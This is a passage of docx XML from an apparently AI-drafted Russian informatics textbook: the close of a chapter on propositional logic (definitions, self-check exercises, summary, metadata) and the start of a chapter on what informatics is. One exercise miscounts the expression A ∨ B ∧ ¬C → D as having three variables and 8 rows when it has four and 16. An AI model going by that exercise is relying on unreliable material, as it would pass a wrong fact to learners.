      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическая переменная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — переменная, принимающая только два значения: истина (1) или ложь (0).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — таблица, показывающая результат логической операции для всех возможных комбинаций входных значений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отрицание (НЕ, NOT, ¬)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция, меняющая значение на противоположное.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конъюнкция (И, AND, ∧)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция, результат которой истинен только когда истинны все операнды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дизъюнкция (ИЛИ, OR, ∨)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция, результат которой истинен когда истинен хотя бы один операнд.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исключающее ИЛИ (XOR, ⊕)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция, результат которой истинен когда операнды различны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Импликация (→)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция "если A, то B", ложная только когда из истинной посылки следует ложное заключение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эквивалентность (↔)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логическая операция, результат которой истинен когда оба операнда одинаковы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Законы де Моргана</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — правила преобразования отрицания конъюнкции в дизъюнкцию отрицаний и наоборот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональная полнота</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — свойство набора логических операций, позволяющее выразить любую логическую функцию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое высказывание?** Приведите три примера высказываний и три примера предложений, которые не являются высказываниями. Объясните, почему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между операциями ИЛИ и Исключающее ИЛИ?** Постройте таблицы истинности для обеих операций и объясните, в каких случаях результаты различаются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Постройте таблицу истинности** для логического выражения: F = (A ∧ ¬B) ∨ (¬A ∧ B). Что вы заметили? Можно ли это выражение заменить более простой операцией?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Упростите логическое выражение** F = ¬(A ∨ B) ∧ (A ∨ C) используя законы алгебры логики. Покажите каждый шаг преобразования с указанием использованного закона.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Докажите с помощью таблицы истинности**, что импликация A → B эквивалентна выражению ¬A ∨ B.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Решите логическую задачу:** Четыре студента — Алиса, Борис, Виктор и Галина — участвуют в конкурсе. Известно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если победит Алиса, то победит и Борис</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Виктор победит тогда и только тогда, когда победит Галина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Борис и Виктор не могут победить одновременно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Может ли Алиса победить в конкурсе? Обоснуйте ответ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение в программировании:** Напишите логическое выражение для условия: "Пользователь может редактировать документ, если он является автором ИЛИ (является модератором И документ не заблокирован)". Формализуйте с помощью переменных A, B, C.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните закон де Моргана** своими словами. Как изменится выражение ¬(A ∧ B ∧ C ∧ D) после применения этого закона?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Порядок операций:** Расставьте скобки в выражении A ∨ B ∧ ¬C → D в соответствии с приоритетом операций. Постройте таблицу истинности для этого выражения (переменных 3, строк будет 8).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическое применение:** Предложите реальную жизненную ситуацию (из программирования, электроники или повседневной жизни), которую можно описать с помощью логического выражения с использованием как минимум трёх различных логических операций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Дополнительные материалы для изучения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для более глубокого понимания алгебры высказываний рекомендуется:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Повторить материал:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.1 (арифметика в двоичной системе) — логика и двоичная арифметика тесно связаны</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.11 (системы счисления) — понимание двоичной системы помогает в работе с битовыми операциями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практические задания:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решить 10-15 задач на построение таблиц истинности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Упростить 5-7 сложных логических выражений с использованием законов алгебры логики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Составить 3-5 логических задач и решить их</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Программирование:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Написать программу, которая вычисляет значение логического выражения по заданным значениям переменных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реализовать генератор таблиц истинности для произвольных выражений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подготовка к следующим темам:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Материал этой главы критически важен для понимания программирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логические операции будут использоваться во всех последующих разделах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили основы алгебры высказываний — фундаментального раздела, на котором построена вся цифровая техника и программирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные достижения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Понятие высказывания и логических значений** — научились отличать высказывания от других типов предложений, поняли бинарную природу логики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Базовые логические операции** — изучили НЕ, И, ИЛИ, XOR и их свойства, научились строить таблицы истинности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Производные операции** — познакомились с импликацией, эквивалентностью, NAND, NOR</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Законы алгебры логики** — освоили основные законы (идемпотентности, дистрибутивности, де Моргана и др.) и научились применять их для упрощения выражений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Приоритет операций** — поняли порядок выполнения логических операций и важность использования скобок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Практическое применение** — увидели, как логические операции используются в программировании, электронике, базах данных и поисковых системах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теперь вы должны уметь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определять, является ли предложение высказыванием</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вычислять результат логических операций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строить таблицы истинности для сложных выражений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применять законы алгебры логики для упрощения выражений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать логические операции в программировании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решать логические задачи методом формализации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важность для дальнейшего обучения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгебра высказываний — это не просто теоретический раздел. Это практический инструмент, который вы будете использовать ежедневно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При написании условий в программах (if, while)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При работе с базами данных (SQL-запросы с WHERE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При проектировании цифровых схем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При анализе алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При решении логических задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Материал этой главы будет активно использоваться в разделах 2 (архитектура ЭВМ), 5 (алгоритмизация), 6 (языки программирования) и 7 (базы данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Конец главы_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Метаинформация (не включается в финальный учебник)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ~35000 символов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время на изучение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 90-120 минут  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Средняя  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предварительные требования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Глава 1.1 (двоичная арифметика)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связанные главы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1.1, 1.11, разделы 2, 5, 6, 7  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ✅ Готова  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дата написания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 14 января 2026  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Автор</w:t>
      </w:r>
      <w:r>
        <w:t>: Агент 7</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.7: Предмет и структура информатики. Понятие информации. Информация в жизни человечества</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информатика является одной из ключевых наук XXI века, определяющей развитие современного общества. Понимание предмета информатики, её структуры и роли информации в жизни человечества необходимо каждому специалисту технического профиля. Эта глава закладывает концептуальный фундамент для всего курса, объясняя, что изучает информатика и почему она столь важна в современном мире.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Данная тема тесно связана с главой 1.5, где мы рассматривали меры информации, и главой 1.10, где будут изучаться свойства информации и информационные процессы. Понимание базовых концепций информатики позволит вам осознанно изучать технические детали, которые будут рассмотрены в последующих главах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы дадим определение информатики как науки, рассмотрим её структуру и основные направления, изучим различные подходы к определению информации и проследим роль информации в развитии человеческой цивилизации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Информатика как наука</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение информатики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это фундаментальная естественная наука, изучающая процессы сбора, хранения, преобразования, передачи и использования информации, а также методы и средства их автоматизации с помощью компьютерных технологий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Термин "информатика" происходит от французского "informatique" (1962 г.), образованного из слов "information" (информация) и "automatique" (автоматика). В англоязычных странах используется термин "Computer Science" (компьютерная наука), что отражает несколько иной акцент — на вычислительные аспекты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предмет информатики</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> составляют:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация как объект изучения (её природа, свойства, виды)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные процессы (сбор, обработка, хранение, передача информации)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные системы и технологии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Методы и алгоритмы обработки информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Технические и программные средства реализации информационных процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи информатики</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> включают:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Исследование информационных процессов любой природы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разработка методов и алгоритмов обработки информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Создание технических и программных средств для автоматизации работы с информацией</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проектирование информационных систем и технологий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Обеспечение информационной безопасности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Изучение фундаментальных свойств информации и законов её обработки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Место информатики в системе наук</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информатика является </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>междисциплинарной наукой</w:t>
      </w:r>
      <w:r>
        <w:t>, тесно связанной со многими областями знаний:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Математика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — предоставляет теоретический аппарат для информатики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дискретная математика (теория графов, комбинаторика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Математическая логика (основа работы компьютеров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Теория вероятностей (анализ алгоритмов, машинное обучение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Численные методы (вычислительная математика)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — определяет физические принципы работы компьютерных систем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Электроника и микроэлектроника</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Квантовая физика (квантовые компьютеры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптика (оптоволоконные сети, оптические диски)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Лингвистика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — связь через обработку естественных языков:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерная лингвистика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Теория формальных языков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантический анализ текстов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Биология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — биоинформатика, нейронные сети:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Моделирование биологических процессов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Анализ геномов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Искусственный интеллект, вдохновленный биологией</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Социальные науки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — информатика влияет на общество:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Социальные сети и коммуникации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Электронное правительство</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цифровая экономика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Структура информатики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информатика как наука включает несколько крупных направлений, каждое из которых имеет свой предмет изучения и методы исследования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Теоретическая информатика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теоретическая информатика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> изучает фундаментальные концепции и математические основы обработки информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные разделы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория алгоритмов** — изучение свойств алгоритмов, их сложности, эффективности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория вычислимости** — что можно вычислить, а что нельзя (проблема остановки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория информации** (К. Шеннон) — количественные меры информации, энтропия, сжатие</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория кодирования** — методы эффективного и надёжного представления информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория формальных языков и автоматов** — основа компиляторов и парсеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория баз данных** — реляционная алгебра, нормализация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория сложности вычислений** — классы P, NP, NP-полные задачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптография** — математические основы защиты информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Прикладная информатика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
